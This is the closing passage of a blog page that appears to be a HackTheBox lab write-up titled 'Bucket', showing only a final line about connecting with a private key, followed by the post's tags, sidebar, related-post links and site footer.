</pre></table></code></div></div><p>And connect using the private key.</p><p><img data-src="/assets/images/7e9120c069594e0d8dcc0e9676a0cad820ceb7a602d70b113bb9214916772594.png" alt="picture 47" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/cloud/" class="post-tag no-text-decoration" >Cloud</a> <a href="/tags/dynamodb/" class="post-tag no-text-decoration" >DynamoDB</a> <a href="/tags/php/" class="post-tag no-text-decoration" >PHP</a> <a href="/tags/unrestricted-file-upload/" class="post-tag no-text-decoration" >Unrestricted File Upload</a> <a href="/tags/bucket-enumeration/" class="post-tag no-text-decoration" >Bucket Enumeration</a> <a href="/tags/pd4lm/" class="post-tag no-text-decoration" >PD4LM</a> <a href="/tags/misconfiguration/" class="post-tag no-text-decoration" >Misconfiguration</a> <a href="/tags/aws-enumeration/" class="post-tag no-text-decoration" >AWS Enumeration</a> <a href="/tags/weak-permissions/" class="post-tag no-text-decoration" >Weak Permissions</a> <a href="/tags/password-reuse/" class="post-tag no-text-decoration" >Password Reuse</a> <a href="/tags/source-code-review/" class="post-tag no-text-decoration" >Source Code Review</a> <a href="/tags/brute-force-attack/" class="post-tag no-text-decoration" >Brute Force Attack</a> <a href="/tags/tunneling/" class="post-tag no-text-decoration" >Tunneling</a> <a href="/tags/arbitrary-file-read/" class="post-tag no-text-decoration" >Arbitrary File Read</a> <a href="/tags/port-forwarding/" class="post-tag no-text-decoration" >Port Forwarding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bucket - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bucket - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Bucket - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Tenet/"><div class="card-body"> <em class="timeago small" date="2022-09-12 11:33:00 +0200" >Sep 12, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Tenet</h3><div class="text-muted small"><p> Tenet is medium rated linux box. It’s all about deserialization and exploiting race condition on the system level ENUMERATION NMAP Nmap scan report for 10.10.10.223 Host is up (0.036s latency). No...</p></div></div></a></div><div class="card"> <a href="/posts/awkward/"><div class="card-body"> <em class="timeago small" date="2023-03-04 10:33:00 +0100" >Mar 4</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Awkward</h3><div class="text-muted small"><p> Enumeration NMAP 1 2 3 4 5 6 Nmap scan report for 10.129.45.168 Host is up (0.045s latency). Not shown: 65514 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ...</p></div></div></a></div><div class="card"> <a href="/posts/Academy/"><div class="card-body"> <em class="timeago small" date="2022-09-22 11:33:00 +0200" >Sep 22, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Academy</h3><div class="text-muted small"><p> Academy is a new product from hack the box and this box gives a preview into it. This box however unlike the real HTB Academy has been made vulnerable ENUMERATION NMAP Let’s start NMAP 1 2 3 4 5 6...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Time/" class="btn btn-outline-primary" prompt="Older"><p>(HTB) - Time</p></a> <a href="/posts/StreamIO/" class="btn btn-outline-primary" prompt="Newer"><p>(HTB) - StreamIO</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
